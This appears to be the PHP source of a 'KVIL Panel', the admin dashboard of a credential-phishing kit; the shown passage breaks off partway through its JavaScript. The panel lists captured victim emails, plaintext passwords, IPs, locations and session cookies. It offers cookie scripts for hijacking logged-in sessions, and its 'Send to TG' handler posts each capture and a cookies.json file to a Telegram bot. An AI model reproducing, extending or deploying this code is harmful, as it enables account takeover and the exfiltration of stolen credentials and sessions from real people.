
<?php
session_start();
$dsn = 'sqlite:' . __DIR__ . '/passwords.db';
try {
    $db = new PDO($dsn);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// Helper function to get/set settings
function getSetting($db, $key, $default = '') {
    $stmt = $db->prepare("SELECT setting_value FROM settings WHERE setting_key = :key");
    $stmt->bindParam(':key', $key);
    $stmt->execute();
    $result = $stmt->fetchColumn();
    return $result !== false ? $result : $default;
}

function setSetting($db, $key, $value) {
    $stmt = $db->prepare("INSERT OR REPLACE INTO settings (setting_key, setting_value, updated_at) VALUES (:key, :value, CURRENT_TIMESTAMP)");
    $stmt->bindParam(':key', $key);
    $stmt->bindParam(':value', $value);
    $stmt->execute();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['logout'])) {
        session_destroy();
        header("Location: check.php");
        exit;
    }

    if (isset($_POST['update_password'])) {
        $newPassword = $_POST['new_password'];
        $hashedPassword = password_hash($newPassword, PASSWORD_BCRYPT);
        $stmt = $db->prepare("UPDATE users SET password = :password WHERE id = 1");
        $stmt->bindParam(':password', $hashedPassword);
        $stmt->execute();
        echo "<script>alert('Password updated successfully!'); window.location.href='check.php';</script>";
        exit;
    }

    if (isset($_POST['delete_account'])) {
        $id = $_POST['account_id'];
        $stmt = $db->prepare("DELETE FROM accounts WHERE id = :id");
        $stmt->bindParam(':id', $id);
        $stmt->execute();
        header("Location: check.php" . ($_GET['filter'] ? '?filter=' . $_GET['filter'] : ''));
        exit;
    }

    if (isset($_POST['bulk_delete'])) {
        $ids = $_POST['selected_accounts'] ?? [];
        if (!empty($ids) && is_array($ids)) {
            $placeholders = implode(',', array_fill(0, count($ids), '?'));
            $stmt = $db->prepare("DELETE FROM accounts WHERE id IN ($placeholders)");
            $stmt->execute($ids);
        }
        $redirect = 'check.php';
        if (isset($_GET['page'])) $redirect .= '?page=' . $_GET['page'];
        if (isset($_GET['filter'])) $redirect .= (strpos($redirect, '?') !== false ? '&' : '?') . 'filter=' . $_GET['filter'];
        if (isset($_GET['service'])) $redirect .= (strpos($redirect, '?') !== false ? '&' : '?') . 'service=' . $_GET['service'];
        if (isset($_GET['search'])) $redirect .= (strpos($redirect, '?') !== false ? '&' : '?') . 'search=' . $_GET['search'];
        header("Location: $redirect");
        exit;
    }

    if (isset($_POST['toggle_verified'])) {
        $id = $_POST['account_id'];
        $stmt = $db->prepare("UPDATE accounts SET verified = NOT verified WHERE id = :id");
        $stmt->bindParam(':id', $id);
        $stmt->execute();
        header("Location: check.php" . ($_GET['id'] ? '?id=' . $_GET['id'] : ''));
        exit;
    }

    if (isset($_POST['toggle_favorite'])) {
        $id = $_POST['account_id'];
        $stmt = $db->prepare("UPDATE accounts SET favorite = NOT favorite WHERE id = :id");
        $stmt->bindParam(':id', $id);
        $stmt->execute();
        header("Location: check.php" . ($_GET['id'] ? '?id=' . $_GET['id'] : ''));
        exit;
    }

    if (isset($_POST['save_settings'])) {
        $telegram_bot_token = $_POST['telegram_bot_token'] ?? '';
        $telegram_chat_id = $_POST['telegram_chat_id'] ?? '';
        setSetting($db, 'telegram_bot_token', $telegram_bot_token);
        setSetting($db, 'telegram_chat_id', $telegram_chat_id);
        header("Location: check.php?page=settings");
        exit;
    }

    if (isset($_POST['send_to_telegram'])) {
        $account_id = $_POST['account_id'];
        $stmt = $db->prepare("SELECT * FROM accounts WHERE id = :id");
        $stmt->bindParam(':id', $account_id);
        $stmt->execute();
        $account = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($account) {
            $bot_token = getSetting($db, 'telegram_bot_token');
            $chat_id = getSetting($db, 'telegram_chat_id');
            
            if ($bot_token && $chat_id) {
                $message = "📧 *New Account Capture*\n\n";
                $message .= "Email: `" . $account['email'] . "`\n";
                $message .= "Password: `" . $account['password'] . "`\n";
                $message .= "IP: " . ($account['ip_address'] ?: 'Unknown') . "\n";
                $message .= "Location: " . ($account['location'] ?: 'Unknown') . "\n";
                $message .= "Browser: " . ($account['browser'] ?: 'Unknown') . "\n";
                $message .= "OS: " . ($account['os'] ?: 'Unknown') . "\n";
                $message .= "Service: " . ($account['service_type'] ?: 'Unknown') . "\n";
                
                // Send as text message
                $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
                $data = [
                    'chat_id' => $chat_id,
                    'text' => $message,
                    'parse_mode' => 'Markdown'
                ];
                
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                
                // If cookies exist, send as document
                if ($account['cookies_json_export']) {
                    $temp_file = tempnam(sys_get_temp_dir(), 'cookies_');
                    file_put_contents($temp_file, $account['cookies_json_export']);
                    
                    $url = "https://api.telegram.org/bot{$bot_token}/sendDocument";
                    $data = [
                        'chat_id' => $chat_id,
                        'caption' => "Cookies for " . $account['email']
                    ];
                    
                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, array_merge($data, [
                        'document' => new CURLFile($temp_file, 'application/json', 'cookies.json')
                    ]));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_exec($ch);
                    curl_close($ch);
                    
                    unlink($temp_file);
                }
                
                echo json_encode(['success' => true, 'message' => 'Sent to Telegram successfully!']);
            } else {
                echo json_encode(['success' => false, 'message' => 'Telegram not configured. Please set bot token and chat ID in Settings.']);
            }
        } else {
            echo json_encode(['success' => false, 'message' => 'Account not found.']);
        }
        exit;
    }

    $password = $_POST['password'] ?? '';
    $stmt = $db->query("SELECT password FROM users WHERE id = 1");
    $storedPassword = $stmt->fetchColumn();

    if ($storedPassword === false) {
        $error = "No stored password found!";
    } elseif (password_verify($password, $storedPassword)) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "Invalid password!";
    }
}

if (!isset($_SESSION['authenticated'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - KVIL Panel</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            }
            .login-container {
                background: rgba(26, 26, 46, 0.95);
                backdrop-filter: blur(10px);
                padding: 50px;
                border-radius: 15px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.5);
                text-align: center;
                width: 400px;
                border: 1px solid rgba(255,255,255,0.1);
            }
            .login-container h2 {
                margin-bottom: 30px;
                color: #fff;
                font-size: 28px;
                font-weight: 600;
            }
            .login-container input {
                width: 100%;
                padding: 14px;
                margin: 10px 0;
                border-radius: 8px;
                border: 1px solid rgba(255,255,255,0.1);
                background: rgba(255,255,255,0.05);
                color: #fff;
                box-sizing: border-box;
                font-size: 14px;
            }
            .login-container input::placeholder {
                color: rgba(255,255,255,0.5);
            }
            .login-container button {
                width: 100%;
                padding: 14px;
                border-radius: 8px;
                border: none;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                margin-top: 10px;
                transition: transform 0.2s, box-shadow 0.2s;
            }
            .login-container button:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
            }
            .error {
                color: #ff6b6b;
                margin-bottom: 15px;
                padding: 10px;
                background: rgba(255, 107, 107, 0.1);
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>KVIL Panel</h2>
            <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Get page parameter
$page = $_GET['page'] ?? 'dashboard';
$filter = $_GET['filter'] ?? 'all';
$service_type = $_GET['service'] ?? '';
$search = $_GET['search'] ?? '';
$selected_id = $_GET['id'] ?? '';

// Build query based on filter
$where = "1=1";
$params = [];

if ($filter === 'new') {
    $where .= " AND verified = 0 AND favorite = 0";
} elseif ($filter === 'verified') {
    $where .= " AND verified = 1";
} elseif ($filter === 'favorites') {
    $where .= " AND favorite = 1";
} elseif ($filter === 'unverified') {
    $where .= " AND verified = 0";
}

if ($service_type) {
    $where .= " AND service_type = :service_type";
    $params[':service_type'] = $service_type;
}

if ($search) {
    $where .= " AND (email LIKE :search OR password LIKE :search)";
    $params[':search'] = "%$search%";
}

// Get counts for sidebar
$counts = [
    'all' => $db->query("SELECT COUNT(*) FROM accounts")->fetchColumn(),
    'new' => $db->query("SELECT COUNT(*) FROM accounts WHERE verified = 0 AND favorite = 0")->fetchColumn(),
    'verified' => $db->query("SELECT COUNT(*) FROM accounts WHERE verified = 1")->fetchColumn(),
    'favorites' => $db->query("SELECT COUNT(*) FROM accounts WHERE favorite = 1")->fetchColumn(),
    'unverified' => $db->query("SELECT COUNT(*) FROM accounts WHERE verified = 0")->fetchColumn(),
];

// Get accounts
$query = "SELECT * FROM accounts WHERE $where ORDER BY created_at DESC";
$stmt = $db->prepare($query);
foreach ($params as $key => $value) {
    $stmt->bindValue($key, $value);
}
$stmt->execute();
$accounts = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Get unique service types
$service_types = $db->query("SELECT DISTINCT service_type FROM accounts WHERE service_type IS NOT NULL AND service_type != '' ORDER BY service_type")->fetchAll(PDO::FETCH_COLUMN);

// Get selected account details
$selected_account = null;
if ($selected_id) {
    $stmt = $db->prepare("SELECT * FROM accounts WHERE id = :id");
    $stmt->bindParam(':id', $selected_id);
    $stmt->execute();
    $selected_account = $stmt->fetch(PDO::FETCH_ASSOC);
} elseif (count($accounts) > 0 && $page === 'dashboard') {
    $selected_account = $accounts[0];
}

// Get Telegram settings
$telegram_bot_token = getSetting($db, 'telegram_bot_token');
$telegram_chat_id = getSetting($db, 'telegram_chat_id');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KVIL Panel - Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }
        .sidebar {
            width: 280px;
            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            padding: 25px;
            overflow-y: auto;
            border-right: 1px solid rgba(255,255,255,0.1);
            box-shadow: 2px 0 10px rgba(0,0,0,0.3);
        }
        .sidebar-logo {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 40px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 1px;
        }
        .nav-item {
            display: flex;
            align-items: center;
            padding: 14px 16px;
            margin: 6px 0;
            border-radius: 10px;
            cursor: pointer;
            text-decoration: none;
            color: rgba(255,255,255,0.8);
            transition: all 0.3s ease;
            font-weight: 500;
        }
        .nav-item:hover {
            background: rgba(255,255,255,0.1);
            color: #fff;
            transform: translateX(5px);
        }
        .nav-item.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .nav-item .icon {
            margin-right: 12px;
            width: 22px;
            text-align: center;
            font-size: 18px;
        }
        .nav-item .count {
            margin-left: auto;
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            background: #0f0f1a;
        }
        .header {
            background: rgba(26, 26, 46, 0.8);
            backdrop-filter: blur(10px);
            padding: 20px 30px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .header-title {
            font-size: 26px;
            font-weight: 700;
            color: #fff;
        }
        .header-controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header-controls select,
        .header-controls input {
            padding: 10px 14px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px;
            font-size: 14px;
            background: rgba(255,255,255,0.05);
            color: #fff;
        }
        .header-controls input {
            width: 280px;
        }
        .header-controls input::placeholder {
            color: rgba(255,255,255,0.4);
        }
        .status-badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .status-verified {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        .status-unverified {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
        }
        .logout-btn {
            padding: 10px 20px;
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .logout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.4);
        }
        .content-area {
            flex: 1;
            display: flex;
            overflow: hidden;
        }
        .accounts-list {
            width: 420px;
            background: rgba(26, 26, 46, 0.5);
            border-right: 1px solid rgba(255,255,255,0.1);
            overflow-y: auto;
        }
        .account-item {
            padding: 18px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        .account-item:hover {
            background: rgba(255,255,255,0.05);
        }
        .account-item.active {
            background: linear-gradient(90deg, rgba(102, 126, 234, 0.2) 0%, transparent 100%);
            border-left: 3px solid #667eea;
        }
        .account-item.selected {
            background: rgba(102, 126, 234, 0.15);
        }
        .account-checkbox {
            margin-top: 2px;
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #667eea;
            flex-shrink: 0;
        }
        .account-content {
            flex: 1;
            min-width: 0;
        }
        .bulk-actions {
            position: sticky;
            bottom: 0;
            background: rgba(26, 26, 46, 0.95);
            backdrop-filter: blur(10px);
            padding: 15px 20px;
            border-top: 1px solid rgba(255,255,255,0.1);
            display: none;
            align-items: center;
            justify-content: space-between;
            z-index: 10;
        }
        .bulk-actions.visible {
            display: flex;
        }
        .bulk-actions-info {
            color: rgba(255,255,255,0.8);
            font-size: 14px;
            font-weight: 600;
        }
        .bulk-delete-btn {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .bulk-delete-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.4);
        }
        .bulk-select-btn {
            background: rgba(255,255,255,0.1);
            color: rgba(255,255,255,0.9);
            padding: 8px 16px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .bulk-select-btn:hover {
            background: rgba(255,255,255,0.15);
            transform: translateY(-1px);
        }
        .account-email {
            font-weight: 600;
            margin-bottom: 8px;
            color: #fff;
            font-size: 15px;
        }
        .account-meta {
            font-size: 12px;
            color: rgba(255,255,255,0.6);
            margin-bottom: 6px;
        }
        .account-date {
            font-size: 11px;
            color: rgba(255,255,255,0.4);
        }
        .details-panel {
            flex: 1;
            background: rgba(15, 15, 26, 0.8);
            padding: 35px;
            overflow-y: auto;
        }
        .details-section {
            margin-bottom: 35px;
            background: rgba(26, 26, 46, 0.6);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .details-section h3 {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            font-size: 20px;
            color: #fff;
            font-weight: 700;
        }
        .details-section .icon {
            margin-right: 12px;
            font-size: 22px;
        }
        .info-row {
            display: flex;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .info-label {
            font-weight: 600;
            width: 160px;
            color: rgba(255,255,255,0.7);
        }
        .info-value {
            flex: 1;
            color: #fff;
        }
        .cookie-code {
            background: #0a0a0f;
            color: #d4d4d4;
            padding: 25px;
            border-radius: 10px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.8;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .action-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .action-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn-copy {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
        }
        .btn-download-console {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            color: white;
        }
        .btn-download-json {
            background: linear-gradient(135deg, #06b6d4 0%, #0891b2 100%);
            color: white;
        }
        .btn-send-tg {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }
        .btn-delete {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .btn-delete:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.4);
        }
        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: rgba(255,255,255,0.5);
        }
        .empty-state h3 {
            margin-bottom: 15px;
            color: rgba(255,255,255,0.7);
            font-size: 20px;
        }
        .settings-form {
            max-width: 600px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: rgba(255,255,255,0.8);
            font-weight: 600;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px;
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 14px;
        }
        .form-group input::placeholder {
            color: rgba(255,255,255,0.3);
        }
        .btn-save {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .btn-save:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .status-toggle-btn {
            padding: 8px 16px;
            margin-right: 10px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .status-toggle-btn:hover {
            transform: translateY(-2px);
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-logo">KVIL Panel</div>
        <a href="?page=dashboard&filter=all" class="nav-item <?php echo $page === 'dashboard' && $filter === 'all' ? 'active' : ''; ?>">
            <span class="icon">📊</span>
            <span>Dashboard</span>
            <span class="count"><?php echo $counts['all']; ?></span>
        </a>
        <a href="?page=dashboard&filter=new" class="nav-item <?php echo $page === 'dashboard' && $filter === 'new' ? 'active' : ''; ?>">
            <span class="icon">🆕</span>
            <span>New</span>
            <span class="count"><?php echo $counts['new']; ?></span>
        </a>
        <a href="?page=dashboard&filter=verified" class="nav-item <?php echo $page === 'dashboard' && $filter === 'verified' ? 'active' : ''; ?>">
            <span class="icon">✓</span>
            <span>Verified</span>
            <span class="count"><?php echo $counts['verified']; ?></span>
        </a>
        <a href="?page=dashboard&filter=favorites" class="nav-item <?php echo $page === 'dashboard' && $filter === 'favorites' ? 'active' : ''; ?>">
            <span class="icon">⭐</span>
            <span>Favorites</span>
            <span class="count"><?php echo $counts['favorites']; ?></span>
        </a>
        <a href="?page=dashboard&filter=unverified" class="nav-item <?php echo $page === 'dashboard' && $filter === 'unverified' ? 'active' : ''; ?>">
            <span class="icon">✗</span>
            <span>Unverified</span>
            <span class="count"><?php echo $counts['unverified']; ?></span>
        </a>
        <a href="?page=settings" class="nav-item <?php echo $page === 'settings' ? 'active' : ''; ?>">
            <span class="icon">⚙️</span>
            <span>Settings</span>
        </a>
    </div>

    <div class="main-content">
        <div class="header">
            <div class="header-left">
                <div class="header-title">
                    <?php 
                    if ($page === 'settings') {
                        echo 'Settings';
                    } else {
                        echo $service_type ? htmlspecialchars($service_type) : 'All Accounts';
                        if ($selected_account) {
                            echo ' <span class="status-badge ' . ($selected_account['verified'] ? 'status-verified' : 'status-unverified') . '">' . 
                                 ($selected_account['verified'] ? 'VERIFIED' : 'UNVERIFIED') . '</span>';
                        }
                    }
                    ?>
                </div>
                <?php if ($selected_account && $page === 'dashboard'): ?>
                    <div style="color: rgba(255,255,255,0.6); font-size: 14px;">
                        <?php echo htmlspecialchars($selected_account['email']); ?>
                    </div>
                <?php endif; ?>
            </div>
            <div class="header-controls">
                <?php if ($page === 'dashboard'): ?>
                    <form method="GET" style="display: flex; gap: 10px; align-items: center;">
                        <input type="hidden" name="page" value="dashboard">
                        <?php if ($filter): ?>
                            <input type="hidden" name="filter" value="<?php echo htmlspecialchars($filter); ?>">
                        <?php endif; ?>
                        <select name="service" onchange="this.form.submit()">
                            <option value="">All Fields</option>
                            <?php foreach ($service_types as $st): ?>
                                <option value="<?php echo htmlspecialchars($st); ?>" <?php echo $service_type === $st ? 'selected' : ''; ?>>
                                    <?php echo htmlspecialchars($st); ?>
                                </option>
                            <?php endforeach; ?>
                        </select>
                        <input type="text" name="search" placeholder="Search..." value="<?php echo htmlspecialchars($search); ?>" onkeyup="if(event.key==='Enter') this.form.submit()">
                    </form>
                <?php endif; ?>
                <form method="POST" style="display: inline;">
                    <button type="submit" name="logout" class="logout-btn">Logout</button>
                </form>
            </div>
        </div>

        <div class="content-area">
            <?php if ($page === 'settings'): ?>
                <div class="details-panel">
                    <div class="details-section">
                        <h3><span class="icon">⚙️</span> Telegram Configuration</h3>
                        <form method="POST" class="settings-form">
                            <div class="form-group">
                                <label>Telegram Bot Token</label>
                                <input type="text" name="telegram_bot_token" placeholder="Enter your Telegram bot token" value="<?php echo htmlspecialchars($telegram_bot_token); ?>">
                            </div>
                            <div class="form-group">
                                <label>Telegram Chat ID</label>
                                <input type="text" name="telegram_chat_id" placeholder="Enter your Telegram chat ID" value="<?php echo htmlspecialchars($telegram_chat_id); ?>">
                            </div>
                            <button type="submit" name="save_settings" class="btn-save">Save Settings</button>
                        </form>
                    </div>
                </div>
            <?php else: ?>
                <div class="accounts-list" style="position: relative;">
                    <?php if (count($accounts) > 0): ?>
                        <?php foreach ($accounts as $account): ?>
                            <div class="account-item <?php echo $selected_account && $selected_account['id'] == $account['id'] ? 'active' : ''; ?>" 
                                 data-account-id="<?php echo $account['id']; ?>"
                                 onclick="handleAccountClick(event, <?php echo $account['id']; ?>)">
                                <input type="checkbox" class="account-checkbox" 
                                       data-account-id="<?php echo $account['id']; ?>"
                                       onclick="event.stopPropagation(); handleCheckboxClick(event, <?php echo $account['id']; ?>)">
                                <div class="account-content">
                                    <div class="account-email"><?php echo htmlspecialchars($account['email']); ?></div>
                                    <div class="account-meta">
                                        <?php 
                                        echo htmlspecialchars($account['location'] ?: 'Unknown') . ' • ' . 
                                             htmlspecialchars($account['os'] ?: 'Unknown') . ' • ' . 
                                             htmlspecialchars($account['browser'] ?: 'Unknown');
                                        ?>
                                    </div>
                                    <div class="account-date">
                                        <?php 
                                        $date = new DateTime($account['created_at']);
                                        echo $date->format('M d, g:i A');
                                        ?>
                                    </div>
                                </div>
                            </div>
                        <?php endforeach; ?>
                        <div class="bulk-actions" id="bulk-actions">
                            <div class="bulk-actions-info">
                                <span id="selected-count">0</span> account(s) selected
                            </div>
                            <div style="display: flex; gap: 10px; align-items: center;">
                                <button type="button" class="bulk-select-btn" onclick="selectAll()">Select All</button>
                                <button type="button" class="bulk-select-btn" onclick="deselectAll()">Deselect All</button>
                                <form method="POST" id="bulk-delete-form" style="display: inline;" onsubmit="return confirm('Are you sure you want to delete the selected accounts? This action cannot be undone.');">
                                    <input type="hidden" name="bulk_delete" value="1">
                                    <div id="selected-accounts-inputs"></div>
                                    <button type="submit" class="bulk-delete-btn">🗑️ Delete Selected</button>
                                </form>
                            </div>
                        </div>
                    <?php else: ?>
                        <div class="empty-state">
                            <h3>No accounts found</h3>
                            <p>Try adjusting your filters or search terms</p>
                        </div>
                    <?php endif; ?>
                </div>

                <div class="details-panel">
                    <?php if ($selected_account): ?>
                        <div class="details-section">
                            <h3><span class="icon">👤</span> User Info</h3>
                            <div class="info-row">
                                <div class="info-label">Email Address:</div>
                                <div class="info-value"><?php echo htmlspecialchars($selected_account['email']); ?></div>
                            </div>
                            <div class="info-row">
                                <div class="info-label">Password:</div>
                                <div class="info-value"><?php echo htmlspecialchars($selected_account['password']); ?></div>
                            </div>
                            <div class="info-row">
                                <div class="info-label">IP Address:</div>
                                <div class="info-value"><?php echo htmlspecialchars($selected_account['ip_address'] ?: '-'); ?></div>
                            </div>
                            <div class="info-row">
                                <div class="info-label">Location:</div>
                                <div class="info-value"><?php echo htmlspecialchars($selected_account['location'] ?: 'Unknown'); ?></div>
                            </div>
                            <div class="info-row">
                                <div class="info-label">Browser & OS:</div>
                                <div class="info-value">
                                    <?php echo htmlspecialchars($selected_account['browser'] ?: 'Unknown') . ' • ' . htmlspecialchars($selected_account['os'] ?: 'Unknown'); ?>
                                </div>
                            </div>
                            <div class="info-row">
                                <div class="info-label">Status:</div>
                                <div class="info-value">
                                    <form method="POST" style="display: inline;">
                                        <input type="hidden" name="account_id" value="<?php echo $selected_account['id']; ?>">
                                        <button type="submit" name="toggle_verified" class="status-toggle-btn" style="background: <?php echo $selected_account['verified'] ? '#10b981' : '#ef4444'; ?>; color: white;">
                                            <?php echo $selected_account['verified'] ? '✓ Verified' : '✗ Unverified'; ?>
                                        </button>
                                    </form>
                                    <form method="POST" style="display: inline;">
                                        <input type="hidden" name="account_id" value="<?php echo $selected_account['id']; ?>">
                                        <button type="submit" name="toggle_favorite" class="status-toggle-btn" style="background: <?php echo $selected_account['favorite'] ? '#fbbf24' : '#6b7280'; ?>; color: white;">
                                            <?php echo $selected_account['favorite'] ? '⭐ Favorite' : '☆ Add to Favorites'; ?>
                                        </button>
                                    </form>
                                    <form method="POST" style="display: inline;" onsubmit="return confirm('Are you sure you want to delete this account?');">
                                        <input type="hidden" name="account_id" value="<?php echo $selected_account['id']; ?>">
                                        <button type="submit" name="delete_account" class="btn-delete">🗑️ Delete</button>
                                    </form>
                                </div>
                            </div>
                        </div>

                        <?php if ($selected_account['cookie_script']): ?>
                            <div class="details-section">
                                <h3><span class="icon">🍪</span> Login Cookies (Recommended)</h3>
                                <div class="cookie-code" id="cookie-code"><?php echo htmlspecialchars($selected_account['cookie_script']); ?></div>
                                <div class="action-buttons">
                                    <button class="action-btn btn-copy" onclick="copyCookie()">Copy Cookie</button>
                                    <button class="action-btn btn-download-console" onclick="downloadConsole()">Download Console</button>
                                    <button class="action-btn btn-download-json" onclick="downloadJSON()">Download JSON</button>
                                    <button class="action-btn btn-send-tg" onclick="sendToTG(<?php echo $selected_account['id']; ?>, this)">Send to TG</button>
                                </div>
                            </div>
                        <?php endif; ?>
                    <?php else: ?>
                        <div class="empty-state">
                            <h3>Select an account</h3>
                            <p>Choose an account from the list to view details</p>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <script>
        let lastCheckedIndex = -1;
        let selectedAccounts = new Set();

        function updateBulkActions() {
            const bulkActions = document.getElementById('bulk-actions');
            const selectedCount = document.getElementById('selected-count');
            const selectedInputs = document.getElementById('selected-accounts-inputs');
            
            if (selectedAccounts.size > 0) {
                bulkActions.classList.add('visible');
                selectedCount.textContent = selectedAccounts.size;
                
                // Update hidden inputs
                selectedInputs.innerHTML = '';
                selectedAccounts.forEach(id => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'selected_accounts[]';
                    input.value = id;
                    selectedInputs.appendChild(input);
                });
            } else {
                bulkActions.classList.remove('visible');
            }
        }

        function selectRange(startIndex, endIndex) {
            const accountItems = Array.from(document.querySelectorAll('.account-item'));
            const start = Math.min(startIndex, endIndex);
            const end = Math.max(startIndex, endIndex);
            
            for (let i = start; i <= end; i++) {
                const item = accountItems[i];
                if (item) {
                    const id = item.dataset.accountId;
                    const checkbox = item.querySelector('.account-checkbox');
                    
                    checkbox.checked = true;
                    selectedAccounts.add(id);
                    item.classList.add('selected');
                }
            }
            
            updateBulkActions();
        }

        function handleAccountClick(event, accountId) {
            // If clicking on checkbox, let the checkbox handler deal with it
            if (event.target.type === 'checkbox') {
                return;
            }
            
            // If shift is held and we have a last checked index
            if (event.shiftKey && lastCheckedIndex !== -1) {
                event.preventDefault();
                event.stopPropagation();
                
